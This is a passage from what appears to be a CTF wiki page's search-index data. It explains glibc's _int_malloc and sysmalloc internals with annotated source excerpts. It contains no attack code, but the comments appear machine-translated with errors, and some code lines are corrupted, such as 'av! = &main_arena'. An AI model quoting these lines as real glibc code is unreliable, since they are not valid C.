arena_for_chunk(mem2chunk(victim)));\n</code></pre> <p>Finally return to memory.</p> <pre><code>    return victim;\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#_int_malloc","title":"_int_malloc","text":"<p>_int_malloc is the core function of memory allocation, and its core ideas are as follows</p> <ol> <li>It implements different allocation methods in turn according to the memory block size and frequency of use of fastbin chunk, small chunk, large chunk of the user's application.</li> <li>It checks from small to large whether there are corresponding free blocks in different bins to satisfy the memory requested by the user.</li> <li>When all free chunks are not met, it considers the top chunk.</li> <li>The heap allocator will only request the memory block when the top chunk is not satisfied.</li> </ol> <p>After entering the function, the function immediately defines a series of variables that you need, and converts the memory size requested by the user to the internal chunk size.</p> <pre><code>static void *_int_malloc(mstate av, size_t bytes) {\n    INTERNAL_SIZE_T nb;  /* normalized request size */\n    unsigned int    idx; /* associated bin index */\n    mbinptr         bin; /* associated bin */\n\n    mchunkptr       victim;       /* inspected/selected chunk */\n    INTERNAL_SIZE_T size;         /* its size */\n    int             victim_index; /* its bin index */\n\n    mchunkptr     remainder;      /* remainder from a split */\n    unsigned long remainder_size; /* its size */\n\n    unsigned int block; /* bit map traverser */\n    unsigned int bit;   /* bit map traverser */\n    unsigned int map;   /* current word of binmap */\n\n    mchunkptr fwd; /* misc temp for linking */\n    mchunkptr bck; /* misc temp for linking */\n\n    const char *errstr = NULL;\n\n    /*\n       Convert request size to internal form by adding SIZE_SZ bytes\n       overhead plus possibly more to obtain necessary alignment and/or\n       to obtain a size of at least MINSIZE, the smallest allocatable\n       size. Also, checked_request2size traps (returning 0) request sizes\n       that are so large that they wrap around zero when padded and\n       aligned.\n     */\n\n    checked_request2size(bytes, nb);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#arena","title":"arena","text":"<pre><code>    /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from\n       mmap.  */\n    if (__glibc_unlikely(av == NULL)) {\n        void * p = sysmalloc(nb, av);\n        if (p != NULL) alloc_perturb(p, bytes);\n        return p;\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#fast-bin","title":"fast bin","text":"<p>If the size of the requested chunk is in the fastbin range, ** note that the comparison here is an unsigned integer. ** In addition, chunk is taken from the head node of fastbin.</p> <pre><code>    /*\n       If the size qualifies as a fastbin, first check corresponding bin.\n       This code is safe to execute even if av is not yet initialized, so we\n       can try it without checking, which saves some time on this fast path.\n     */\n    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) {\n        // Get the corresponding subscript of fastbin\n        idx             = fastbin_index(nb);\n        // Get the corresponding pointer to the fastbin\n        mfastbinptr * fb = &amp;fastbin(av, idx);\n        mchunkptr    pp = *fb;\n        // Use fd to traverse the corresponding bin whether there are free chunks,\n        do {\n            victim = pp;\n            if (victim == NULL) break;\n        } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,\n                                                            victim)) != victim);\n        // There are chunks that can be used\n        if (victim != 0) {\n            // Check if the chunk size retrieved is consistent with the corresponding fastbin index.\n            // Calculate its size using chunksize based on the obtained victim.\n            // Calculate the index of the chunk using fastbin_index.\n            if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) {\n                errstr = \"malloc(): memory corruption (fast)\";\n\n            errout:\n                malloc_printerr(check_action, errstr, chunk2mem(victim), av);\n                return NULL;\n            }\n            // Careful inspection. . Useful only when DEBUG\n            check_remalloced_chunk(av, victim, nb);\n            // Convert the obtained chunk to mem mode\n            void *p = chunk2mem(victim);\n            // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff\n            alloc_perturb(p, bytes);\n            return p;\n        }\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#small-bin","title":"small bin","text":"<p>If the range of the obtained memory block is in the range of the small bin, then the following process is performed.</p> <pre><code>    /*\n       If a small request, check regular bin.  Since these \"smallbins\"\n       hold one size each, no searching within bins is necessary.\n       (For a large request, we need to wait until unsorted chunks are\n       processed to find best fit. But for small ones, fits are exact\n       anyway, so we can check now, which is faster.)\n     */\n\n    if (in_smallbin_range(nb)) {\n        // Get the index of the small bin\n        idx = smallbin_index(nb);\n        // Get the corresponding chunk pointer in the small bin\n        bin = bin_at(av, idx);\n        // first execute victim = last(bin) to get the last chunk of the small bin\n        // If victim = bin , then the bin is empty.\n        // If they are not equal, then there will be two cases\n        if ((victim = last(bin)) != bin) {\n            // In the first case, the small bin has not yet been initialized.\n            if (victim == 0) /* initialization check */\n                // Perform initialization to merge chunks in fast bins\n                malloc_consolidate(av);\n            // In the second case, there is a free chunk in the small bin\n            else {\n                // Get the second-to-last chunk in the small bin.\n                bck = victim-&gt;bk;\n                // Check if bck-&gt;fd is victim, prevent forgery\n                if (__glibc_unlikely(bck-&gt;fd != victim)) {\n                    errstr = \"malloc(): smallbin double linked list corrupted\";\n                    goto errout;\n                }\n                // Set the corresponding inuse bit of victim\n                set_inuse_bit_at_offset(victim, nb);\n                // Modify the small bin list, take the last chunk of the small bin\n                bin-&gt;bk = bck;\n                bck-&gt;fd = bin;\n                // If it is not main_arena, set the corresponding flag\n                if (av != &amp;main_arena) set_non_main_arena(victim);\n                // Detailed inspection, non-debug status has no effect\n                check_malloced_chunk(av, victim, nb);\n                // Convert the requested chunk to the corresponding mem state\n                void *p = chunk2mem(victim);\n                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff\n                alloc_perturb(p, bytes);\n                return p;\n            }\n        }\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#large-bin","title":"large bin","text":"<p>When the chunks in the fast bin and small bin cannot satisfy the user request chunk hour, it will consider whether it is a large bin. However, in the large bin, there is no direct scan of the chunk in the corresponding bin. Instead, the malloc_consolidate(see malloc_state related function) function is used to process the chunk in the fast bin, and the chunks that may be merged are merged and then placed. In the unsorted bin, if you can't merge, put it directly into the unsorted bin, and then process it in the big loop below. ** Why not just take the large chunk directly from the corresponding bin? This is the mechanism of ptmalloc, which merges fragment chunks in the heap before allocating large chunks to reduce fragmentation in the heap. **</p> <pre><code>    /*\n       If this is a large request, consolidate fastbins before continuing.\n       While it might look excessive to kill all fastbins before\n       even seeing if there is space available, this avoids\n       fragmentation problems normally associated with fastbins.\n       Also, in practice, programs tend to have runs of either small or\n       large requests, but less often mixtures, so consolidation is not\n       invoked all that often in most programs. And the programs that\n       it is called frequently in otherwise tend to fragment.\n     */\n\n    else {\n        // Get the subscript of the large bin.\n        idx = largebin_index(nb);\n        // If there is fastbin, it will handle fastbin\n      if (have_fastchunks(av)) malloc_consolidate(av);\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#big-loop-traversing-unsorted-bin","title":"Big loop - traversing unsorted bin","text":"<p>**If the program is executed here, it means that there is no chunk in the bin (fast bin, small bin) that is exactly the same as the chunk size, which can directly satisfy the demand, but the large chunk is processed in this big loop.</p> <p>In the next cycle, the main operations are as follows</p> <ul> <li>Take the chunks in the unsorted bin one by one in the FIFO mode</li> <li>If it is a small request, consider whether it is just satisfied, if it is, return directly.</li> <li>If not, put it in the corresponding bin.</li> <li>Try to allocate the memory required by the user from the large bin</li> </ul> <p>This part is a big loop, this is to try to redistribute the small bin chunk, because we will first use the large bin, top chunk to try to satisfy the user's request, but if it is not satisfied, because we did not assign it successfully Small bin, we didn't merge the chunks in the fast bin, so we'll merge the fast bin chunks and use a big loop to try to allocate the small bin chunk again.</p> <pre><code>    /*\n       Process recently freed or remaindered chunks, taking one only if\n       it is exact fit, or, if this a small request, the chunk is remainder from\n       the most recent non-exact fit.  Place other traversed chunks in\n       bins.  Note that this step is the only place in any routine where\n       chunks are placed in bins.\n\n       The outer loop here is needed because we might not realize until\n       near the end of malloc that we should have consolidated, so must\n       do so and retry. This happens at most once, and only when we would\n       otherwise need to expand memory to service a \"small\" request.\n     */\n\n    for (;;) {\n        int iters = 0;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#unsorted-bin-traversing","title":"unsorted bin Traversing","text":"<p>Consider the unsorted bin first, then consider the last remainder, but there are exceptions to the request for the small bin chunk.</p> <p>** Note that the traversal order of unsorted bin is bk. **</p> <pre><code>        // If the unsorted bin is not empty\n        // First In First Out\n        while ((victim = unsorted_chunks(av)-&gt;bk)! = unsorted_chunks(av)) {\n            // victim is the last chunk of unsorted bin\n            // bck is the penultimate chunk of unsorted bin\n            bck = victim-&gt;bk;\n\n            // Determine whether the obtained chunk meets the requirements, can not be too small, can not be too large\n            // The size of the general system_mem is 132K\n            if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) ||\n                __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0))\n                malloc_printerr(check_action, \"malloc(): memory corruption\",\n                                chunk2mem(victim), av);\n            // Get the chunk size corresponding to the victim.\n            size = chunksize(victim);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#small-request","title":"small request","text":"<p>If the user's request is a small bin chunk, then we first consider the last remainder. If the last remainder is the only one in the unsorted bin, and the size of the last remainder is enough to be a chunk, why is there no equal sign**?</p> <pre><code>            /*\n               If a small request, try to use last remainder if it is the\n               only chunk in unsorted bin.  This helps promote locality for\n               runs of consecutive small requests. This is the only\n               exception to best-fit, and applies only when there is\n               no exact fit for a small chunk.\n             */\n\n            if (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;\n                victim == av-&gt;last_remainder &amp;&amp;\n                (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) {\n                /* split and reattach remainder */\n                // Get the size of the new retriever\n                remainder_size          = size - nb;\n                // Get the location of the new retriever\n                remainder               = chunk_at_offset(victim, nb);\n                // update the unsorted bin\n                unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;\n                // update the last_remainder recorded in av\n                av-&gt;last_remainder = remainder;\n                // Update the pointer of the last remainder\n                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);\n                if (!in_smallbin_range(remainder_size)) {\n                    remainder-&gt;fd_nextsize = NULL;\n                    remainder-&gt;bk_nextsize = NULL;\n                }\n                // Set the victim's head,\n                set_head(victim, nb | PREV_INUSE |\n                                    (av! = &amp;main_arena? NON_MAIN_ARENA: 0));\n                // Set the head of the remainder\n                set_head(remainder, remainder_size | PREV_INUSE);\n                // Set the prev_size field of the record remainder size because the retriever is idle at this time.\n                set_foot(remainder, remainder_size);\n                // Detailed inspection, no effect in non-debug mode\n                check_malloced_chunk(av, victim, nb);\n                // Convert victim from chunk mode to mem mode\n                void *p = chunk2mem(victim);\n                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff\n                alloc_perturb(p, bytes);\n                return p;\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#initial-take-out","title":"Initial take out","text":"<pre><code>            /* remove from unsorted list */\n            unsorted_chunks(av)-&gt;bk = bck;\n            bck-&gt;fd = unsorted_chunks(av);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#exact-fit","title":"exact fit","text":"<p>If the chunk size taken from the unsorted bin is just right, use it directly. Here we should have allocated the appropriate chunks after the merger.</p> <pre><code>            /* Take now instead of binning if exact fit */\n            if (size == nb) {\n                set_inuse_bit_at_offset(victim, size);\n                if (av != &amp;main_arena) set_non_main_arena(victim);\n                check_malloced_chunk(av, victim, nb);\n                void *p = chunk2mem(victim);\n                alloc_perturb(p, bytes);\n                return p;\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#place-chunk-in-small-bin","title":"place chunk in small bin","text":"<p>Put the extracted chunk into the corresponding small bin.</p> <pre><code>            /* place chunk in bin */\n            if (in_smallbin_range(size)) {\n                victim_index = smallbin_index(size);\n                bck = bin_at(av, victim_index);\n                fwd          = bck-&gt;fd;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#place-chunk-in-large-bin","title":"place chunk in large bin","text":"<p>Put the fetched chunks into the corresponding large bin.</p> <pre><code>            } else {\n                // large bin range\n                victim_index = largebin_index(size);\n                bck = bin_at(av, victim_index); // the head of the current large bin\n                fwd          = bck-&gt;fd;\n\n                /* maintain large bins in sorted order */\n                /* From here we can conclude that largebin is sorted in descending order by fd_nextsize.\n                The same size chunk, later will only be inserted into the same size chunk before.\n                It is easy to understand without modifying the same size fd/bk_nextsize.\n                Can reduce overhead. In addition, the bin header does not participate in the nextsize link. */\n                // If the large bin list is not empty\n                if (fwd != bck) {\n                    /* Or with inuse bit to speed comparisons */\n                    // Accelerate comparisons, not only should this be considered, because the chunks in the list will set this bit.\n                    size |= PREV_INUSE;\n                    /* if smaller than smallest, bypass loop below */\n                    // bck-&gt;bk stores the smallest chunk in the corresponding large bin.\n                    // If the traversed chunk is smaller than the current minimum, then it only needs to be inserted at the end of the list.\n                    // Determine if bck-&gt;bk is in main arena.\n                    assert(chunk_main_arena(bck-&gt;bk));\n                    if ((unsigned long) (size) &lt;\n                        (unsigned long) chunksize_nomask(bck-&gt;bk)) {\n                        // Let fwd point to the big bin header\n                        fwd = bck;\n                        // Let bck point to the largin bin tail chunk\n                        bck = bck-&gt;bk;\n                        // victim's fd_nextsize points to the first chunk of largin bin\n                        victim-&gt;fd_nextsize = fwd-&gt;fd;\n                        // victim's bk_nextsize points to the bk_nextsize pointed to by the first chunk of the original list.\n                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;\n                        // The bk_nextsize of the first chunk of the original list points to the victim\n                        // The original fd_nextsize pointing to the first chunk of the list points to victim\n                        fwd-&gt;fd-&gt;bk_nextsize =\n                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n                    } else {\n                        // The size of the victim currently being inserted is larger than the smallest chunk\n                        // Determine if fwd is in main arena\n                        assert(chunk_main_arena(fwd));\n                        // Start from the head of the list to find a chunk that is no bigger than the victim.\n                        while ((unsigned long) size &lt; chunksize_nomask(fwd)) {\n                            fwd = fwd-&gt;fd_nextsize;\n                            assert(chunk_main_arena(fwd));\n                        }\n                        // If you find a chunk that is as big as the victim,\n                        // Then insert the chunk directly after the chunk and don't modify the nextsize pointer.\n                        if ((unsigned long) size ==\n                            (unsigned long) chunksize_nomask(fwd))\n                            /* Always insert in the second position.  */\n                            fwd = fwd-&gt;fd;\n                        else {\n                            // If the chunk found is not the same size as the current victim\n                            // Then you need to construct a nextsize doubly linked list.\n                            victim-&gt;fd_nextsize              = fwd;\n                            victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;\n                            fwd-&gt;bk_nextsize                 = victim;\n                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n                        }\n                        bck = fwd-&gt;bk;\n                    }\n                } else\n                    // If it is empty, simply make fd_nextsize and bk_nextsize form a doubly linked list.\n                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;\n\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#final-take-out","title":"Final take out","text":"<pre><code>            // Put it in the corresponding bin to form bck&lt;--&gt;victim&lt;--&gt;fwd.\n            mark_bin(av, victim_index);\n            victim-&gt;bk = bck;\n            victim-&gt;fd = fwd;\n            fwd-&gt;bk    = victim;\n            bck-&gt;fd    = victim;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#while-iterations","title":"while Iterations","text":"<p>While exits up to 10,000 iterations and exits.</p> <pre><code>            // # define MAX_ITERS 10000\n            if (++iters &gt;= MAX_ITERS) break;\n                    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#large-chunk","title":"large chunk","text":"<p>**Note: It may be very strange, why not go to see if the small chunk meets the new requirements first? This is because the small bin has already been judged before the loop. If there is one, the chunk will appear after the merge. But outside the big loop, the large chunk simply finds its index, so it feels reasonable to judge directly here, and also to find larger chunks for the following. **</p> <p>If the requested chunk is in the large chunk range, it is scanned from small to large in the corresponding bin to find the first one.</p> <pre><code>        /*\n           If a large request, scan through the chunks of current bin in\n           sorted order to find smallest that fits.  Use the skip list for this.\n         */\n\n        if (!in_smallbin_range(nb)) {\n            bin = bin_at(av, idx);\n            /* skip scan if empty or largest chunk is too small */\n            // If the corresponding bin is empty or the chunks in it are the smallest, skip it\n            // first(bin)=bin-&gt;fd means the largest chunk in the current list.\n            if ((victim = first(bin)) != bin &amp;&amp;\n                (unsigned long) chunksize_nomask(victim) &gt;=\n                    (unsigned long) (nb)) {\n                // Reverse traversing the list until the first chunk is found that is not less than the desired chunk size\n                victim = victim-&gt;bk_nextsize;\n                while (((unsigned long) (size = chunksize(victim)) &lt;\n                        (unsigned long) (nb)))\n                    victim = victim-&gt;bk_nextsize;\n\n                /* Avoid removing the first entry for a size so that the skip\n                   list does not have to be rerouted.  */\n                // If the final chunk is not the last chunk in the bin, and the chunk is in front of the chunk\n                // The size is the same, then we take the chunk in front of it, so we can avoid adjusting bk_nextsize, fd_nextsize\n                // linked list. Because only one chunk of the same size will be chained to the nextsize chain.\n                if (victim != last(bin) &amp;&amp;\n                    chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))\n                    victim = victim-&gt;fd;\n                // Calculate the remaining size after the allocation\n                remainder_size = size - nb;\n                // unlink\n                unlink(av, victim, bck, fwd);\n                /* Exhaust */\n                // The remaining size is not enough to be a block\n                // Very curious what will happen next?\n                if (remainder_size &lt; MINSIZE) {\n                    set_inuse_bit_at_offset(victim, size);\n                    if (av != &amp;main_arena) set_non_main_arena(victim);\n                }\n                /* Split */\n                // The remaining size can also be split as a chunk.\n                else {\n                    // Get the pointer to the remaining chunk, called the reducer\n                    remainder = chunk_at_offset(victim, nb);\n                    /* We cannot assume the unsorted list is empty and therefore\n                       have to perform a complete insert here.  */\n                    // Insert in unsorted bin\n                    bck = unsorted_chunks(av);\n                    fwd = bck-&gt;fd;\n\n                    // Determine if the unsorted bin is destroyed.\n                    if (__glibc_unlikely(fwd-&gt;bk != bck)) {\n                        errstr = \"malloc(): corrupted unsorted chunks\";\n                        goto errout;\n                    }\n                    remainder-&gt;bk = bck;\n                    remainder-&gt;fd = fwd;\n                    bck-&gt;fd       = remainder;\n                    fwd-&gt;bk       = remainder;\n                    // If it is not in the range of small bin, set the corresponding field\n                    if (!in_smallbin_range(remainder_size)) {\n                        remainder-&gt;fd_nextsize = NULL;\n                        remainder-&gt;bk_nextsize = NULL;\n                    }\n\n                    // Set the flag of the assigned chunk\n                    set_head(victim,\n                             nb | PREV_INUSE |\n                                (av! = &amp;main_arena? NON_MAIN_ARENA: 0));\n                    // Set the last chunk of the remainder, that is, the usage status of the allocated chunk\n                    // The rest of the rules are inherited directly from above.\n                    set_head(remainder, remainder_size | PREV_INUSE);\n                    // Set the size of the remainder\n                    set_foot(remainder, remainder_size);\n                }\n                // an examination\n                check_malloced_chunk(av, victim, nb);\n                // Convert to mem state\n                void *p = chunk2mem(victim);\n                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff\n                alloc_perturb(p, bytes);\n                return p;\n            }\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#looking-for-a-larger-chunk","title":"Looking for a larger chunk","text":"<p>If you get here, it means that for the chunks that the user needs, you can't get the chunk directly from the corresponding bin, so we need to find the faster bin, small bin or large bin larger than the current bin.</p> <pre><code>        /*\n           Search for a chunk by scanning bins, starting with next largest\n           bin. This search is strictly by best-fit; i.e., the smallest\n           (with ties going to approximately the least recently used) chunk\n           that fits is selected.\n\n           The bitmap avoids needing to check that most blocks are nonempty.\n           The particular case of skipping all bins during warm-up phases\n           when no chunks have been returned yet is faster than it might look.\n         */\n\n        ++idx;\n        // Get the corresponding bin\n        bin = bin_at(av, idx);\n        // Get the current index in the binmap block index\n        // #define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)  ,BINMAPSHIFT=5\n        // Binmap is managed by block. Each block is an int with a total of 32 bits. It can indicate whether there are free chunks in 32 bins.\n        // So here is the right shift 5\n        block = idx2block(idx);\n        // Get the mapping corresponding to the current block size, here you can know whether there is a free block in the corresponding bin\n        map = av-&gt;binmap [block];\n        // #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))\n        // Set the bit corresponding to idx to 1, and the other bits to 0.\n        bit   = idx2bit(idx);\n        for (;;) {\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#find-a-suitable-map","title":"Find a suitable map","text":"<pre><code>            /* Skip rest of block if there are no more set bits in this block.\n             */\n\n            // If bit&gt;map, it means that there is no free block in the map that is larger than the current required chunk.\n            // If the bit is 0, then the parameter brought by idx2bit above is 0.\n            if (bit &gt; map || bit == 0) {\n                do {\n                    // Find the next block until its corresponding map is not 0.\n                    // If it doesn't exist, you can only use the top chunk.\n                    if (++block &gt;= BINMAPSIZE) /* out of bins */\n                        goto use_top;\n                } while ((map = av-&gt;binmap[ block ]) == 0);\n                // Get its corresponding bin, because the chunk size in the map is larger than the required chunk, and\n                // map itself is not 0, so there must be a chunk that meets the requirements.\n                bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));\n                bit = 1;\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#find-the-right-bin","title":"Find the right bin","text":"<pre><code>            /* Advance to bin with set bit. There must be one. */\n\n            // Find from the smallest bin of the current map until you find the appropriate bin.\n            // This is definitely there.\n            while ((bit &amp; map) == 0) {\n                bin = next_bin(bin);\n                bit &lt;&lt;= 1;\n                assert(bit != 0);\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#simple-check-chunk","title":"Simple check chunk","text":"<pre><code>            /* Inspect the bin. It is likely to be non-empty */\n\n            // Get the corresponding bin\n            victim = last(bin);\n\n            /*  If a false alarm(empty bin), clear the bit. */\n            // If victim=bin, then we clear the bit corresponding to the map to 0 and then get the next bin.\n            // The probability of this happening should be small.\n            if (victim == bin) {\n                av-&gt;binmap[ block ] = map &amp;= ~bit; /* Write through */\n                bin                 = next_bin(bin);\n                bit &lt;&lt;= 1;\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#really-take-out-chunk","title":"Really take out chunk","text":"<pre><code>            else {\n                // Get the size of the corresponding victim\n                size = chunksize(victim);\n\n                /*  We know the first chunk in this bin is big enough to use. */\n                assert((unsigned long) (size) &gt;= (unsigned long) (nb));\n                // Calculate the remaining size after splitting\n                remainder_size = size - nb;\n\n                /* unlink */\n                unlink(av, victim, bck, fwd);\n\n                /* Exhaust */\n                // What if there is not enough chunk after splitting?\n                if (remainder_size &lt; MINSIZE) {\n                    set_inuse_bit_at_offset(victim, size);\n                    if (av != &amp;main_arena) set_non_main_arena(victim);\n                }\n\n                /* Split */\n                // If enough, despite the segmentation\n                else {\n                    // Calculate the offset of the remaining chunk\n                    remainder = chunk_at_offset(victim, nb);\n\n                    /* We cannot assume the unsorted list is empty and therefore\n                       have to perform a complete insert here.  */\n\n                    // Insert the remaining chunks into the unsorted bin\n                    bck = unsorted_chunks(av);\n                    fwd = bck-&gt;fd;\n                    if (__glibc_unlikely(fwd-&gt;bk != bck)) {\n                        errstr = \"malloc(): corrupted unsorted chunks 2\";\n                        goto errout;\n                    }\n                    remainder-&gt;bk = bck;\n                    remainder-&gt;fd = fwd;\n                    bck-&gt;fd       = remainder;\n                    fwd-&gt;bk       = remainder;\n\n                    /* advertise as last remainder */\n                    // If it is in the range of small bin, mark it as a remainder\n                    if (in_smallbin_range(nb)) av-&gt;last_remainder = remainder;\n                    if (!in_smallbin_range(remainder_size)) {\n                        remainder-&gt;fd_nextsize = NULL;\n                        remainder-&gt;bk_nextsize = NULL;\n                    }\n                    // Set the use status of the victim\n                    set_head(victim,\n                             nb | PREV_INUSE |\n                                (av! = &amp;main_arena? NON_MAIN_ARENA: 0));\n                    // Set the usage status of the remainder. Why is this?\n                    set_head(remainder, remainder_size | PREV_INUSE);\n                    // Set the size of the remainder\n                    set_foot(remainder, remainder_size);\n                }\n                // an examination\n                check_malloced_chunk(av, victim, nb);\n                // The chunk state is converted to the mem state.\n                void *p = chunk2mem(victim);\n                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff\n                alloc_perturb(p, bytes);\n                return p;\n            }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#using-top-chunk","title":"Using top chunk","text":"<p>If all the chunks in the bin have no way to directly meet the requirements (that is, not merged), or there are no free chunks. Then we can only use the top chunk.</p> <pre><code>    use_top:\n        /*\n           If large enough, split off the chunk bordering the end of memory\n           (held in av-&gt;top). Note that this is in accord with the best-fit\n           search rule.  In effect, av-&gt;top is treated as larger (and thus\n           less well fitting) than any other available chunk since it can\n           be extended to be as large as necessary (up to system\n           limitations).\n\n           We require that av-&gt;top always exists (i.e., has size &gt;=\n           MINSIZE) after initialization, so if it would otherwise be\n           exhausted by current request, it is replenished. (The main\n           reason for ensuring it exists is that we may need MINSIZE space\n           to put in fenceposts in sysmalloc.)\n         */\n\n        // Get the current top chunk and calculate its corresponding size\n        victim = av-&gt;top;\n        size   = chunksize(victim);\n        // If the top chunk size still satisfies the minimum size of chunk after splitting, then you can split directly.\n        if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {\n            remainder_size = size - nb;\n            remainder      = chunk_at_offset(victim, nb);\n            av-&gt;top = remainder;\n            // Here, set PREV_INUSE because if the previous chunk of the top chunk is bound to be fastbin,\n            // The top chunk will merged, so PREV_INUSE is set here.\n            set_head(victim, nb | PREV_INUSE |\n                                (av! = &amp;main_arena? NON_MAIN_ARENA: 0));\n            set_head(remainder, remainder_size | PREV_INUSE);\n            check_malloced_chunk(av, victim, nb);\n            void *p = chunk2mem(victim);\n            alloc_perturb(p, bytes);\n            return p;\n        }\n        // Otherwise, determine if there is a fast chunk\n        /* When we are using atomic ops to free fast chunks we can get\n           here for all block sizes.  */\n        else if (have_fastchunks(av)) {\n            // Perform a fast bin merge first\n            malloc_consolidate(av);\n            /* restore original bin index */\n            // Determine whether the required chunk is in the range of small bin or large bin\n            // and calculate the corresponding index\n            // Wait for the next time to see if you can\n            if (in_smallbin_range(nb))\n                idx = smallbin_index(nb);\n            else\n                idx = largebin_index(nb);\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#heap-memory-is-not-enough","title":"Heap memory is not enough","text":"<p>If the heap memory is not enough, we need to use <code>sysmalloc</code> to apply for memory.</p> <pre><code>        /*\n           Otherwise, relay to handle system-dependent cases\n         */\n\n        // Otherwise, we can only apply for a bit of memory from the system again.\n        else {\n            void * p = sysmalloc(nb, av);\n            if (p != NULL) alloc_perturb(p, bytes);\n            return p;\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#_libc_calloc","title":"_libc_calloc","text":"<p>Calloc is also a function in libc that requests memory blocks. The package in <code>libc</code> is <code>_libc_calloc</code>, which is described below.</p> <pre><code>/*\n  calloc(size_t n_elements, size_t element_size);\n  Returns a pointer to n_elements * element_size bytes, with all locations\n  set to zero.\n*/\nvoid*  __libc_calloc(size_t, size_t);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#sysmalloc","title":"sysmalloc","text":"<p>As the comment in the function header says, this function is used to request more memory from the system when the current heap is out of memory.</p> <pre><code>/*\n   sysmalloc handles malloc cases requiring more memory from the system.\n   On entry, it is assumed that av-&gt;top does not have enough\n   space to service request for nb bytes, thus requiring that av-&gt;top\n   be extended or replaced.\n */\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#basic-definition","title":"Basic definition","text":"<pre><code>static void *sysmalloc(INTERNAL_SIZE_T nb, mstate av) {\n  mchunkptr old_top;        /* incoming value of av-&gt;top */\n  INTERNAL_SIZE_T old_size; /* its size */\n  char *old_end;            /* its end address */\n\n  long size; /* arg to first MORECORE or mmap call */\n  char *brk; /* return value from MORECORE */\n\n  long correction; /* arg to 2nd MORECORE call */\n  char *snd_brk;   /* 2nd return val */\n\n  INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */\n  INTERNAL_SIZE_T end_misalign;   /* partial page left at end of new space */\n  char *aligned_brk;              /* aligned offset into brk */\n\n  mchunkptr p;                  /* the allocated/returned chunk */\n  mchunkptr remainder;          /* remainder frOm allocation */\n  unsigned long remainder_size; /* its size */\n\n  size_t pagesize = GLRO(dl_pagesize);\n  bool tried_mmap = false;\n</code></pre> <p>We can mainly focus on <code>pagesize</code>, which</p> <pre><code>#ifndef EXEC_PAGESIZE\n#define EXEC_PAGESIZE   4096\n#endif\n# define GLRO(name) _##name\nsize_t _dl_pagesize = EXEC_PAGESIZE;\n</code></pre> <p>So, <code>pagesize=4096=0x1000</code>.</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#consider-mmap","title":"Consider mmap","text":"<p>As stated in the opening comment, if any of the following conditions are met</p> <ol> <li>There is no heap allocated.</li> <li>If the requested memory is larger than <code>mp_.mmap_threshold</code> and the number of mmap is less than the maximum value, you can try to use mmap.</li> </ol> <p>By default, the threshold is</p> <pre><code>static struct malloc_par mp_ = {\n    .top_pad = DEFAULT_TOP_PAD,\n    .n_mmaps_max = DEFAULT_MMAP_MAX,\n    .mmap_threshold = DEFAULT_MMAP_THRESHOLD,\n    .trim_threshold = DEFAULT_TRIM_THRESHOLD,\n#define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))\n    .arena_test = NARENAS_FROM_NCORES(1)\n#if USE_TCACHE\n        ,\n    .tcache_count = TCACHE_FILL_COUNT,\n    .tcache_bins = TCACHE_MAX_BINS,\n    .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - 1),\n    .tcache_unsorted_limit = 0 